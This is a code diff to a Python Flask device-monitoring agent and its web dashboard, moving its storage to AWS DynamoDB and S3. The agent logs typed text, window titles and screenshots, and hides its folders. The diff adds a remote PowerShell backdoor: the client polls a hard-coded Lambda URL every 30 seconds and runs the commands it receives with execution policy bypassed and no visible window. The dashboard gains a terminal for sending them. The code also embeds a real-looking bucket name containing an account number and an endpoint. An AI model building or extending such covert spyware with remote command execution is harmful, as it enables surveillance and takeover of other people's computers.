@@ -31,9 +31,10 @@ try:
 except ImportError:
     mss = None
 
+import base64
+import urllib.request
 from flask import Flask, jsonify, send_from_directory, render_template_string, request
 from dotenv import load_dotenv
-from supabase import create_client, Client
 
 # Change working directory to the directory of this script to avoid writing to C:\Windows\system32
 try:
@@ -41,20 +42,61 @@ try:
 except Exception:
     pass
 
-# Load environment variables
+# Load environment variables (.EVN or .env)
+load_dotenv(".EVN")
 load_dotenv()
 
-SUPABASE_URL = os.getenv("SUPABASE_URL")
-SUPABASE_KEY = os.getenv("SUPABASE_KEY")
-SUPABASE_BUCKET = os.getenv("SUPABASE_BUCKET", "screenshots")
+# AWS Configuration (100% Native AWS: DynamoDB + S3)
+AWS_REGION = os.getenv("AWS_REGION", "ap-south-1")
+S3_BUCKET = os.getenv("S3_BUCKET", "mstool-screenshots-687159379620-ap-south-1")
+DEVICES_TABLE = os.getenv("DEVICES_TABLE", "mstool_devices")
+LOGS_TABLE = os.getenv("LOGS_TABLE", "mstool_activity_logs")
+RENDER_SERVER_URL = os.getenv("RENDER_SERVER_URL", "https://lnslbk3kmal2h2cdlfrvzpwgmu0qzetl.lambda-url.ap-south-1.on.aws")
 
-# Initialize Supabase client
-supabase = None
-if SUPABASE_URL and SUPABASE_KEY:
+# Initialize AWS clients
+ddb = None
+ddb_client = None
+s3_client = None
+devices_tbl = None
+logs_tbl = None
+
+try:
+    import boto3
+    from botocore.config import Config
+    
+    if os.environ.get("AWS_LAMBDA_FUNCTION_NAME"):
+        # Running inside AWS Lambda: Use the automatic IAM execution role credentials!
+        boto_session = boto3.Session(region_name=AWS_REGION)
+    else:
+        # Local workstation: read credentials from .EVN or environment
+        aws_ak = os.getenv("AWS_ACCESS_KEY") or os.getenv("AWS_ACCESS_KEY_ID")
+        aws_sk = os.getenv("AWS_SECRET_KEY") or os.getenv("AWS_SECRET_ACCESS_KEY")
+        
+        boto_kwargs = {"region_name": AWS_REGION}
+        if aws_ak and aws_sk:
+            boto_kwargs["aws_access_key_id"] = aws_ak
+            boto_kwargs["aws_secret_access_key"] = aws_sk
+            
+        boto_session = boto3.Session(**boto_kwargs)
+    ddb = boto_session.resource("dynamodb", region_name=AWS_REGION)
+    ddb_client = boto_session.client("dynamodb", region_name=AWS_REGION)
+    s3_client = boto_session.client("s3", region_name=AWS_REGION)
+    devices_tbl = ddb.Table(DEVICES_TABLE)
+    logs_tbl = ddb.Table(LOGS_TABLE)
+except Exception as e:
+    print(f"AWS Boto3 initialization notice: {e}")
+
+def get_screenshot_signed_url(filename, expires_in=3600):
+    if not filename or not s3_client or not S3_BUCKET:
+        return None
     try:
-        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
-    except Exception as e:
-        print(f"Error initializing Supabase client: {e}")
+        return s3_client.generate_presigned_url(
+            'get_object',
+            Params={'Bucket': S3_BUCKET, 'Key': filename},
+            ExpiresIn=expires_in
+        )
+    except Exception:
+        return None
 
 # Unique device identification helper
 def get_device_id():
@@ -92,19 +134,36 @@ def get_device_id():
         return socket.gethostname() or "unknown_device"
 
 def register_device():
-    if supabase is None:
-        return
     device_id = get_device_id()
     hostname = socket.gethostname() or "Unknown Device"
-    try:
-        supabase.table("devices").upsert({
-            "device_id": device_id,
-            "nickname": hostname,
-            "last_active": datetime.now(timezone.utc).isoformat()
-        }).execute()
-        print(f"Device successfully registered/updated: {device_id} ({hostname})")
-    except Exception as e:
-        print(f"Failed to register/upsert device in Supabase: {e}")
+    now_iso = datetime.now(timezone.utc).isoformat()
+    
+    # 1. Direct DynamoDB
+    if devices_tbl is not None:
+        try:
+            devices_tbl.update_item(
+                Key={"device_id": device_id},
+                UpdateExpression="SET last_active = :la, nickname = if_not_exists(nickname, :hn)",
+                ExpressionAttributeValues={":la": now_iso, ":hn": hostname}
+            )
+            print(f"Device successfully registered/updated in DynamoDB: {device_id} ({hostname})")
+            return
+        except Exception as e:
+            print(f"Failed to register device in DynamoDB: {e}")
+
+    # 2. HTTP Fallback to Central AWS Server
+    server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
+    if server_url:
+        try:
+            req = urllib.request.Request(
+                f"{server_url.rstrip('/')}/api/client/register",
+                data=json.dumps({"device_id": device_id, "hostname": hostname, "last_active": now_iso}).encode('utf-8'),
+                headers={"Content-Type": "application/json"}
+            )
+            with urllib.request.urlopen(req, timeout=10) as r:
+                print(f"Device registered with AWS Central Server: {device_id} ({hostname})")
+        except Exception as se:
+            print(f"Failed to register device with AWS Central Server: {se}")
 
 is_monitoring_disabled = False
 disable_mouse_clicks = False
@@ -116,22 +175,31 @@ last_pending_screenshot_log_id = None
 last_active_window = ""
 
 def check_remote_config_loop():
-    global is_monitoring_disabled, disable_mouse_clicks, periodic_screenshot_interval, zero_footprint, idle_threshold
-    if supabase is None:
-        return
+    global is_monitoring_disabled, disable_mouse_clicks, periodic_screenshot_interval, zero_footprint, idle_threshold, only_capture_on_switch
     device_id = get_device_id()
     while True:
         try:
-            res = supabase.table("activity_logs") \
-                .select("typed_text") \
-                .eq("device_id", device_id) \
-                .eq("window_title", "__DEVICE_CONFIG__") \
-                .limit(1) \
-                .execute()
-            
-            config = {}
-            if res.data:
-                config = json.loads(res.data[0].get("typed_text", "{}"))
+            config = None
+            if devices_tbl is not None:
+                try:
+                    res = devices_tbl.get_item(Key={"device_id": device_id})
+                    if "Item" in res and "config" in res["Item"]:
+                        cfg_val = res["Item"]["config"]
+                        config = json.loads(cfg_val) if isinstance(cfg_val, str) else cfg_val
+                except Exception as de:
+                    print(f"Error reading config from DynamoDB: {de}")
+                    
+            if config is None:
+                server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
+                if server_url:
+                    try:
+                        req = urllib.request.Request(f"{server_url.rstrip('/')}/api/client/config?device_id={device_id}")
+                        with urllib.request.urlopen(req, timeout=10) as r:
+                            config = json.loads(r.read().decode('utf-8'))
+                    except Exception:
+                        pass
+                        
+            if config:
                 is_monitoring_disabled = config.get("is_disabled", False)
                 disable_mouse_clicks = config.get("disable_mouse_clicks", False)
                 periodic_screenshot_interval = int(config.get("periodic_screenshot_interval", 300))
@@ -139,12 +207,6 @@ def check_remote_config_loop():
                 idle_threshold = int(config.get("idle_threshold", 300))
                 only_capture_on_switch = config.get("only_capture_on_switch", False)
             else:
-                is_monitoring_disabled = False
-                disable_mouse_clicks = False
-                periodic_screenshot_interval = 300
-                zero_footprint = False
-                idle_threshold = 300
-                only_capture_on_switch = False
                 config = {
                     "is_disabled": False,
                     "disable_mouse_clicks": False,
@@ -153,42 +215,146 @@ def check_remote_config_loop():
                     "idle_threshold": 300,
                     "only_capture_on_switch": False
                 }
-            
-            # Write sync status back to Supabase
-            try:
-                # 1. Clean up old sync status rows for this device
-                supabase.table("activity_logs") \
-                    .delete() \
-                    .eq("device_id", device_id) \
-                    .eq("window_title", "__CLIENT_SYNC_STATUS__") \
-                    .execute()
                 
-                # 2. Insert fresh sync status row
-                sync_payload = {
-                    **config,
-                    "synced_at": datetime.now().isoformat()
-                }
-                supabase.table("activity_logs").insert({
-                    "device_id": device_id,
-                    "window_title": "__CLIENT_SYNC_STATUS__",
-                    "typed_text": json.dumps(sync_payload),
-                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                    "created_date": datetime.now().strftime("%Y-%m-%d")
-                }).execute()
-            except Exception as se:
-                print(f"Failed to write sync status: {se}")
-                
+            sync_payload = {**config, "synced_at": datetime.now().isoformat()}
+            if devices_tbl is not None:
+                try:
+                    devices_tbl.update_item(
+                        Key={"device_id": device_id},
+                        UpdateExpression="SET sync_status = :ss",
+                        ExpressionAttributeValues={":ss": json.dumps(sync_payload)}
+                    )
+                except Exception:
+                    pass
+            else:
+                server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
+                if server_url:
+                    try:
+                        req = urllib.request.Request(
+                            f"{server_url.rstrip('/')}/api/client/sync-status",
+                            data=json.dumps({"device_id": device_id, "sync_status": sync_payload}).encode('utf-8'),
+                            headers={"Content-Type": "application/json"}
+                        )
+                        with urllib.request.urlopen(req, timeout=10) as r:
+                            pass
+                    except Exception:
+                        pass
+
+            # ---- Remote PowerShell Command Polling ----
+            _poll_and_run_remote_command(device_id)
+
         except Exception as e:
             print(f"Failed to check remote config status: {e}")
             
-        # Poll interval from environment variable (default: 900 seconds / 15 minutes)
         poll_interval = int(os.getenv("CONFIG_POLL_INTERVAL", "900"))
         time.sleep(poll_interval)
 
+def _poll_and_run_remote_command(device_id):
+    """
+    Poll for a pending remote PowerShell command from the server and execute it.
+    Posts the result back to the server. Called from the config polling loop.
+    Only runs on Windows client (not in SERVER_ONLY mode).
+    """
+    if os.name != 'nt':
+        return
+    try:
+        server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL", "")
+        if not server_url:
+            # Direct DynamoDB check
+            if devices_tbl is not None:
+                res = devices_tbl.get_item(Key={"device_id": device_id})
+                item = res.get("Item", {})
+                pending_raw = item.get("pending_command")
+                cmd_obj = json.loads(pending_raw) if isinstance(pending_raw, str) else (pending_raw or {})
+                if cmd_obj.get("status") != "pending":
+                    return
+                command_id = cmd_obj.get("command_id")
+                command = cmd_obj.get("command", "")
+                # Mark as dispatched immediately
+                cmd_obj["status"] = "dispatched"
+                devices_tbl.update_item(
+                    Key={"device_id": device_id},
+                    UpdateExpression="SET pending_command = :pc",
+                    ExpressionAttributeValues={":pc": json.dumps(cmd_obj)}
+                )
+                _run_and_report_command(device_id, command_id, command, via_http=False)
+            return
+
+        # HTTP path: poll from Lambda
+        poll_url = f"{server_url.rstrip('/')}/api/client/command/poll?device_id={device_id}"
+        req = urllib.request.Request(poll_url)
+        with urllib.request.urlopen(req, timeout=10) as r:
+            data = json.loads(r.read().decode('utf-8'))
+        if data.get("has_command"):
+            command_id = data["command_id"]
+            command = data["command"]
+            _run_and_report_command(device_id, command_id, command, via_http=True, server_url=server_url)
+    except Exception as e:
+        print(f"[RemoteCmd] Poll error: {e}")
+
+def _run_and_report_command(device_id, command_id, command, via_http=True, server_url=""):
+    """Execute a PowerShell command and post result back."""
+    print(f"[RemoteCmd] Executing command {command_id[:8]}: {command[:80]}")
+    exit_code = -1
+    output = ""
+    try:
+        result = subprocess.run(
+            ["powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", command],
+            capture_output=True, text=True, timeout=120,
+            creationflags=0x08000000 if os.name == 'nt' else 0
+        )
+        output = (result.stdout or "") + (result.stderr or "")
+        exit_code = result.returncode
+    except subprocess.TimeoutExpired:
+        output = "ERROR: Command timed out after 120 seconds."
+        exit_code = -1
+    except Exception as e:
+        output = f"ERROR executing command: {e}"
+        exit_code = -1
+
+    result_payload = {
+        "device_id": device_id,
+        "command_id": command_id,
+        "output": output[:8000],
+        "exit_code": exit_code
+    }
+    print(f"[RemoteCmd] Done (exit={exit_code}). Reporting result...")
+
+    if via_http and server_url:
+        try:
+            req = urllib.request.Request(
+                f"{server_url.rstrip('/')}/api/client/command/result",
+                data=json.dumps(result_payload).encode('utf-8'),
+                headers={"Content-Type": "application/json"}
+            )
+            with urllib.request.urlopen(req, timeout=15) as r:
+                pass
+        except Exception as e:
+            print(f"[RemoteCmd] Failed to post result via HTTP: {e}")
+    else:
+        # Direct DynamoDB write
+        if devices_tbl is not None:
+            try:
+                result_obj = {
+                    "command_id": command_id,
+                    "output": output[:8000],
+                    "exit_code": exit_code,
+                    "completed_at": datetime.now(timezone.utc).isoformat(),
+                    "status": "completed"
+                }
+                devices_tbl.update_item(
+                    Key={"device_id": device_id},
+                    UpdateExpression="SET completed_command = :cc, pending_command = :pc",
+                    ExpressionAttributeValues={
+                        ":cc": json.dumps(result_obj),
+                        ":pc": json.dumps({"status": "idle"})
+                    }
+                )
+            except Exception as e:
+                print(f"[RemoteCmd] Failed to post result to DynamoDB: {e}")
+
 def window_monitor_loop():
     global last_active_window, last_pending_screenshot_log_id, only_capture_on_switch
-    if supabase is None:
-        return
     while True:
         try:
             if not is_monitoring_disabled:
@@ -197,25 +363,22 @@ def window_monitor_loop():
                     last_active_window = current_window
                     
                 if current_window != last_active_window:
-                    # Focus switched away from active application!
-                    # Capture the final screenshot of that session if optimized mode is ON
                     if only_capture_on_switch and last_pending_screenshot_log_id is not None:
                         log_id_to_update = last_pending_screenshot_log_id
-                        last_pending_screenshot_log_id = None # Clear immediately
+                        last_pending_screenshot_log_id = None
                         
                         url, filename = capture_and_upload_screenshot("screenshot_switch")
                         if url and filename:
-                            try:
-                                supabase.table("activity_logs") \
-                                    .update({
-                                        "screenshot_url": url,
-                                        "screenshot_filename": filename
-                                    }) \
-                                    .eq("id", log_id_to_update) \
-                                    .execute()
-                            except Exception as ue:
-                                print(f"Failed to update switch screenshot: {ue}")
-                                
+                            if logs_tbl is not None and isinstance(log_id_to_update, dict):
+                                try:
+                                    logs_tbl.update_item(
+                                        Key={"device_id": log_id_to_update["device_id"], "timestamp_id": log_id_to_update["timestamp_id"]},
+                                        UpdateExpression="SET screenshot_url = :url, screenshot_filename = :fn",
+                                        ExpressionAttributeValues={":url": url, ":fn": filename}
+                                    )
+                                except Exception as ue:
+                                    print(f"Failed to update switch screenshot in DynamoDB: {ue}")
+                                    
                     last_active_window = current_window
         except Exception as e:
             print(f"Error in window monitor loop: {e}")
@@ -226,6 +389,17 @@ server_only = os.getenv('SERVER_ONLY', 'false').lower() == 'true' or pynput is N
 if not server_only:
     register_device()
     threading.Thread(target=check_remote_config_loop, daemon=True).start()
+    # Dedicated fast-polling thread for remote PS commands (every 30s)
+    def _cmd_poll_loop():
+        device_id = get_device_id()
+        time.sleep(35)  # Initial delay offset from config loop
+        while True:
+            try:
+                _poll_and_run_remote_command(device_id)
+            except Exception as e:
+                print(f"[RemoteCmd] Loop error: {e}")
+            time.sleep(30)
+    threading.Thread(target=_cmd_poll_loop, daemon=True).start()
 
 def hide_directory(path):
     """Sets a directory attribute to hidden in Windows (NT)."""
@@ -238,10 +412,13 @@ def hide_directory(path):
         pass
 
 # Initialize logs and screenshots directories (kept for fallback / temp storage)
-os.makedirs("logs", exist_ok=True)
-hide_directory("logs")
-os.makedirs("screenshots", exist_ok=True)
-hide_directory("screenshots")
+try:
+    os.makedirs("logs", exist_ok=True)
+    hide_directory("logs")
+    os.makedirs("screenshots", exist_ok=True)
+    hide_directory("screenshots")
+except Exception:
+    pass
 
 # Initialize global activity timers
 last_activity_time = datetime.now()
@@ -1067,12 +1244,51 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         </div>
     </div>
 
+    <!-- Terminal Modal -->
+    <div id="terminal-modal" class="modal-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:2100; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition: opacity 0.2s ease;">
+        <div style="background:#0d1117; border:1px solid #30363d; border-radius:12px; width:720px; max-width:95%; padding:1.25rem; box-shadow:0 8px 32px rgba(0,0,0,0.7); display:flex; flex-direction:column; gap:0.75rem;">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <div style="display:flex; align-items:center; gap:0.6rem;">
+                    <svg style="width:18px;height:18px;color:#58a6ff;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                    <span style="font-size:1rem; font-weight:600; color:#e6edf3;">Remote PowerShell</span>
+                    <span id="terminal-device-label" style="font-size:0.8rem; color:#8b949e; background:#21262d; padding:2px 8px; border-radius:4px;"></span>
+                </div>
+                <button onclick="closeTerminalModal()" style="background:none; border:none; color:#8b949e; cursor:pointer; font-size:1.25rem;">&times;</button>
+            </div>
+            <div id="terminal-output" style="font-family:'Cascadia Code','Consolas',monospace; font-size:0.82rem; background:#010409; border:1px solid #21262d; border-radius:6px; padding:0.75rem 1rem; min-height:280px; max-height:380px; overflow-y:auto; color:#e6edf3; white-space:pre-wrap; line-height:1.6;">
+                <span style="color:#8b949e;">&#x25BA; Remote PowerShell terminal ready. Commands run on the target device.\n&#x26A0;&#xFE0F;  Client must be online and polling (every 30s). Allow ~1 min for response.\n</span>
+            </div>
+            <div style="display:flex; gap:0.5rem; align-items:center; background:#010409; border:1px solid #21262d; border-radius:6px; padding:0.5rem 0.75rem;">
+                <span style="color:#3fb950; font-family:monospace; font-size:0.9rem; white-space:nowrap;">PS &gt;</span>
+                <input type="text" id="terminal-input" placeholder="Enter PowerShell command..." onkeydown="if(event.key==='Enter') sendTerminalCommand()"
+                    style="flex:1; background:none; border:none; outline:none; color:#e6edf3; font-family:'Cascadia Code','Consolas',monospace; font-size:0.85rem;">
+                <button onclick="sendTerminalCommand()" id="terminal-send-btn"
+                    style="background:#238636; border:none; color:#fff; padding:0.3rem 0.9rem; border-radius:5px; font-size:0.8rem; font-weight:600; cursor:pointer; white-space:nowrap;">Run</button>
+            </div>
+            <div style="font-size:0.75rem; color:#6e7681; display:flex; gap:1rem; flex-wrap:wrap;">
+                <span>&#128161; <b style="color:#8b949e;">Quick:</b></span>
+                <span onclick="setTerminalCmd('Get-Process | Sort-Object CPU -Desc | Select-Object -First 15 | Format-Table Name,CPU,WorkingSet -Auto')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">Top Processes</span>
+                <span onclick="setTerminalCmd('Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID,@{n=\'Free(GB)\';e={[math]::Round($_.FreeSpace/1GB,1)}},@{n=\'Size(GB)\';e={[math]::Round($_.Size/1GB,1)}} | Format-Table')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">Disk Space</span>
+                <span onclick="setTerminalCmd('Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,AddressFamily | Format-Table')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">Network IPs</span>
+                <span onclick="setTerminalCmd('Get-EventLog -LogName System -Newest 20 -EntryType Error | Format-Table TimeGenerated,Source,Message -Wrap')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">System Errors</span>
+                <span onclick="setTerminalCmd('systeminfo | Select-String \"OS Name|System Boot|Total Physical\"')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">System Info</span>
+                <span onclick="setTerminalCmd('Get-ScheduledTask | Where-Object {$_.State -eq \"Running\"} | Select-Object TaskName,TaskPath | Format-Table')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">Running Tasks</span>
+            </div>
+        </div>
+    </div>
+
     <!-- Settings Modal -->
     <div id="settings-modal" class="modal-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.75); z-index:2000; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition: opacity 0.2s ease;">
         <div class="modal-content" style="background:var(--bg-card); border:1px solid var(--border); border-radius:12px; width:450px; max-width:90%; padding:1.5rem; box-shadow:0 8px 32px rgba(0,0,0,0.5);">
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1.25rem; border-bottom:1px solid var(--border); padding-bottom:0.75rem;">
                 <h3 style="margin:0; font-size:1.15rem; color:var(--text-main);">Device Settings</h3>
-                <button onclick="closeSettingsModal()" style="background:none; border:none; color:var(--text-muted); cursor:pointer; font-size:1.25rem;">&times;</button>
+                <div style="display:flex; gap:0.5rem; align-items:center;">
+                    <button onclick="openTerminalModal()" title="Remote PowerShell Terminal" style="background:#1f2937; border:1px solid #374151; color:#58a6ff; padding:0.35rem 0.75rem; border-radius:6px; font-size:0.8rem; font-weight:600; cursor:pointer; display:flex; align-items:center; gap:0.4rem;">
+                        <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                        Terminal
+                    </button>
+                    <button onclick="closeSettingsModal()" style="background:none; border:none; color:var(--text-muted); cursor:pointer; font-size:1.25rem;">&times;</button>
+                </div>
             </div>
             
             <div style="margin-bottom: 1.25rem; padding: 0.75rem; border-radius: 8px; background-color: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.2); font-size: 0.85rem; font-weight: 500; display: flex; align-items: center; gap: 0.5rem;" id="settings-sync-status">
@@ -1410,6 +1626,120 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 modal.style.display = 'none';
             }, 200);
         }
+
+        // ==================== REMOTE POWERSHELL TERMINAL ====================
+        let terminalPollInterval = null;
+        let terminalCurrentCommandId = null;
+        let terminalPollCount = 0;
+
+        function openTerminalModal() {
+            if (!selectedDevice) return;
+            const d = allDevices.find(dev => dev.device_id === selectedDevice);
+            const label = d ? (d.nickname || d.device_id.substring(0, 12) + '...') : selectedDevice;
+            document.getElementById('terminal-device-label').innerText = label;
+            const modal = document.getElementById('terminal-modal');
+            modal.style.display = 'flex';
+            setTimeout(() => {
+                modal.style.opacity = '1';
+                modal.style.pointerEvents = 'auto';
+                document.getElementById('terminal-input').focus();
+            }, 50);
+        }
+
+        function closeTerminalModal() {
+            const modal = document.getElementById('terminal-modal');
+            modal.style.opacity = '0';
+            modal.style.pointerEvents = 'none';
+            if (terminalPollInterval) { clearInterval(terminalPollInterval); terminalPollInterval = null; }
+            setTimeout(() => { modal.style.display = 'none'; }, 200);
+        }
+
+        function setTerminalCmd(cmd) {
+            document.getElementById('terminal-input').value = cmd;
+            document.getElementById('terminal-input').focus();
+        }
+
+        function terminalLog(text, color) {
+            const out = document.getElementById('terminal-output');
+            const span = document.createElement('span');
+            span.style.color = color || '#e6edf3';
+            span.textContent = text + '\n';
+            out.appendChild(span);
+            out.scrollTop = out.scrollHeight;
+        }
+
+        async function sendTerminalCommand() {
+            const input = document.getElementById('terminal-input');
+            const cmd = input.value.trim();
+            if (!cmd || !selectedDevice) return;
+
+            if (terminalPollInterval) { clearInterval(terminalPollInterval); terminalPollInterval = null; }
+
+            terminalLog('PS > ' + cmd, '#3fb950');
+            input.value = '';
+            document.getElementById('terminal-send-btn').disabled = true;
+            document.getElementById('terminal-send-btn').innerText = 'Waiting...';
+            terminalLog('⏳ Dispatching command to device...', '#8b949e');
+
+            try {
+                const res = await fetch('/api/devices/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: selectedDevice, command: cmd })
+                });
+                const data = await res.json();
+                if (!res.ok) {
+                    terminalLog('✗ Error: ' + (data.error || 'Failed to dispatch'), '#f85149');
+                    document.getElementById('terminal-send-btn').disabled = false;
+                    document.getElementById('terminal-send-btn').innerText = 'Run';
+                    return;
+                }
+                terminalCurrentCommandId = data.command_id;
+                terminalPollCount = 0;
+                terminalLog('📡 Command dispatched (ID: ' + data.command_id.substring(0, 8) + '). Waiting for client to run it...', '#8b949e');
+                // Poll every 5s, up to 60 attempts (5 minutes)
+                terminalPollInterval = setInterval(pollTerminalResult, 5000);
+            } catch (err) {
+                terminalLog('✗ Network error: ' + err.message, '#f85149');
+                document.getElementById('terminal-send-btn').disabled = false;
+                document.getElementById('terminal-send-btn').innerText = 'Run';
+            }
+        }
+
+        async function pollTerminalResult() {
+            terminalPollCount++;
+            if (terminalPollCount > 60) {
+                clearInterval(terminalPollInterval); terminalPollInterval = null;
+                terminalLog('⏱ Timeout: No response from device after 5 minutes. Device may be offline.', '#f85149');
+                document.getElementById('terminal-send-btn').disabled = false;
+                document.getElementById('terminal-send-btn').innerText = 'Run';
+                return;
+            }
+            try {
+                const res = await fetch(`/api/devices/command/result?device_id=${encodeURIComponent(selectedDevice)}&command_id=${encodeURIComponent(terminalCurrentCommandId)}`);
+                const data = await res.json();
+                if (data.status === 'completed' && data.result) {
+                    clearInterval(terminalPollInterval); terminalPollInterval = null;
+                    const r = data.result;
+                    const exitColor = r.exit_code === 0 ? '#3fb950' : '#f85149';
+                    terminalLog('─'.repeat(60), '#30363d');
+                    if (r.output && r.output.trim()) {
+                        terminalLog(r.output, '#e6edf3');
+                    } else {
+                        terminalLog('(no output)', '#8b949e');
+                    }
+                    terminalLog(`\n✓ Exit code: ${r.exit_code}  |  Completed: ${new Date(r.completed_at).toLocaleTimeString()}`, exitColor);
+                    terminalLog('─'.repeat(60), '#30363d');
+                    document.getElementById('terminal-send-btn').disabled = false;
+                    document.getElementById('terminal-send-btn').innerText = 'Run';
+                    document.getElementById('terminal-input').focus();
+                }
+                // else keep polling (pending/dispatched)
+            } catch (err) {
+                // ignore transient poll errors
+            }
+        }
+        // ==================== END REMOTE TERMINAL ====================
         
         async function saveSettings() {
             const nickname = document.getElementById('settings-nickname').value;
@@ -2251,12 +2581,14 @@ def serve_screenshot(filename):
 
 @app.route('/api/devices')
 def get_devices():
-    if supabase is not None:
+    if devices_tbl is not None:
         try:
-            res = supabase.table("devices").select("*").order("nickname").execute()
-            return jsonify(res.data)
+            res = devices_tbl.scan()
+            items = res.get("Items", [])
+            items.sort(key=lambda d: d.get("nickname", "").lower())
+            return jsonify(items)
         except Exception as e:
-            print(f"Failed to query devices from Supabase: {e}")
+            print(f"Failed to query devices from DynamoDB: {e}")
             
     # Fallback/local mode
     device_id = get_device_id()
@@ -2265,22 +2597,23 @@ def get_devices():
 
 @app.route('/api/devices/rename', methods=['POST'])
 def rename_device():
-    data = request.json
+    data = request.json or {}
     device_id = data.get("device_id")
     nickname = data.get("nickname")
     if not device_id or not nickname:
         return jsonify({"error": "Device ID and Nickname required"}), 400
         
-    if supabase is not None:
+    if devices_tbl is not None:
         try:
-            supabase.table("devices") \
-                .update({"nickname": nickname}) \
-                .eq("device_id", device_id) \
-                .execute()
+            devices_tbl.update_item(
+                Key={"device_id": device_id},
+                UpdateExpression="SET nickname = :nn",
+                ExpressionAttributeValues={":nn": nickname}
+            )
             return jsonify({"status": "success"}), 200
         except Exception as e:
             return jsonify({"error": str(e)}), 500
-    return jsonify({"error": "Supabase not configured"}), 500
+    return jsonify({"error": "DynamoDB not configured"}), 500
 
 @app.route('/api/devices/delete', methods=['DELETE'])
 def delete_device():
@@ -2288,42 +2621,43 @@ def delete_device():
     if not device_id:
         return jsonify({"error": "Device ID required"}), 400
         
-    if supabase is not None:
+    if devices_tbl is not None:
         try:
-            # 1. Fetch screenshot filenames to purge from Storage
-            res = supabase.table("activity_logs") \
-                .select("screenshot_filename") \
-                .eq("device_id", device_id) \
-                .execute()
-                
-            if res.data:
-                screenshot_files = [
-                    row.get("screenshot_filename")
-                    for row in res.data
-                    if row.get("screenshot_filename")
-                ]
-                
-                # Delete files from storage
-                if screenshot_files and SUPABASE_BUCKET:
-                    for i in range(0, len(screenshot_files), 100):
-                        batch = screenshot_files[i:i+100]
+            # 1. Fetch screenshot filenames to purge from S3
+            if logs_tbl is not None:
+                res = logs_tbl.query(
+                    KeyConditionExpression="device_id = :did",
+                    ExpressionAttributeValues={":did": device_id},
+                    ProjectionExpression="timestamp_id, screenshot_filename"
+                )
+                items = res.get("Items", [])
+                s3_keys = [it["screenshot_filename"] for it in items if it.get("screenshot_filename")]
+                if s3_keys and s3_client and S3_BUCKET:
+                    for i in range(0, len(s3_keys), 1000):
+                        batch = s3_keys[i:i+1000]
                         try:
-                            supabase.storage.from_(SUPABASE_BUCKET).remove(batch)
+                            s3_client.delete_objects(
+                                Bucket=S3_BUCKET,
+                                Delete={"Objects": [{"Key": k} for k in batch]}
+                            )
                         except Exception:
                             pass
-                            
-            # 2. Delete logs matching the device
-            supabase.table("activity_logs").delete().eq("device_id", device_id).execute()
-            
-            # 3. Delete the device registration row itself
-            supabase.table("devices").delete().eq("device_id", device_id).execute()
+                # 2. Delete all log items for this device
+                with logs_tbl.batch_writer() as batch:
+                    for it in items:
+                        batch.delete_item(Key={"device_id": device_id, "timestamp_id": it["timestamp_id"]})
+                        
+            # 3. Delete the device registration record
+            devices_tbl.delete_item(Key={"device_id": device_id})
             return jsonify({"status": "success"}), 200
         except Exception as e:
             return jsonify({"error": str(e)}), 500
+    return jsonify({"error": "DynamoDB not configured"}), 500
+
 @app.route('/api/logs/purge-range', methods=['POST'])
 def purge_range():
     try:
-        data = request.json
+        data = request.json or {}
         device_id = data.get("device_id")
         start_date = data.get("start_date")
         end_date = data.get("end_date")
@@ -2332,49 +2666,45 @@ def purge_range():
             return jsonify({"error": "Device ID required"}), 400
             
         all_time = not start_date or not end_date
-        
         deleted_count = 0
-        if supabase is not None:
+        if logs_tbl is not None:
             try:
-                # 1. Fetch screenshot filenames to delete from Storage
-                query = supabase.table("activity_logs") \
-                    .select("screenshot_filename") \
-                    .eq("device_id", device_id) \
-                    .neq("window_title", "__DEVICE_CONFIG__")
-                    
-                if not all_time:
-                    query = query.gte("created_date", start_date).lte("created_date", end_date)
-                    
-                res = query.execute()
-                    
-                if res.data:
-                    screenshot_files = [
-                        row.get("screenshot_filename")
-                        for row in res.data
-                        if row.get("screenshot_filename")
-                    ]
-                    
-                    if screenshot_files and SUPABASE_BUCKET:
-                        for i in range(0, len(screenshot_files), 100):
-                            batch = screenshot_files[i:i+100]
-                            try:
-                                supabase.storage.from_(SUPABASE_BUCKET).remove(batch)
-                            except Exception:
-                                pass
-                                
-                # 2. Delete database rows
-                del_query = supabase.table("activity_logs") \
-                    .delete() \
-                    .eq("device_id", device_id) \
-                    .neq("window_title", "__DEVICE_CONFIG__")
-                    
-                if not all_time:
-                    del_query = del_query.gte("created_date", start_date).lte("created_date", end_date)
-                    
-                del_res = del_query.execute()
-                deleted_count = len(del_res.data) if del_res.data else 0
+                if all_time:
+                    res = logs_tbl.query(
+                        KeyConditionExpression="device_id = :did",
